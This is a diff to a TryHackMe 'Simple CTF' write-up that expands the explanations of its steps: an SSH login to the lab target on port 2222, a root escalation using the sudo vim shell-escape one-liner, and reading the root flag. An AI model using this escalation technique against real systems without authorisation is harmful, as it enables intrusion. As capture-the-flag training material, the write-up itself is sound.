@@ -200,8 +200,8 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invali
 ```
 
 #
-> Step
-17. `ssh {USERNAME}@{TARGET IP} -p 2222`
+> Connecting to the Target Using SSH
+17. `ssh {USERNAME}@{TARGET IP} -p 2222` to establish an SSH connection to the target's server using the set of credentials that we now have and the SSH server that's running on port 2222 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ ssh mitch@10.10.130.66 -p 2222
@@ -251,14 +251,14 @@ User mitch may run the following commands on Machine:
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/GTFOBins.png)
 
-24. `sudo vim -c ':!/bin/sh'`
+24. `sudo vim -c ':!/bin/sh'` to open the Vim text editor with root privileges and execute the shell command, which spawned us a Bourne shell (sh)
 ```bash
 $ sudo vim -c ':!/bin/sh'
 #
 ```
-25. `whoami` 
-26. `ls /root`
-27. `cat {ROOT TEXT FILE}`
+25. `whoami` to verify that we're now running as root, which we are
+26. `ls /root` to list the available files and directories within the target's **/root** directory, which contained a text file named "root" 
+27. `cat {ROOT TEXT FILE}` to display the contents of the root text file onto our terminal, which ended up containing the root flag for this challenge
 ```bash
 # whoami
 root
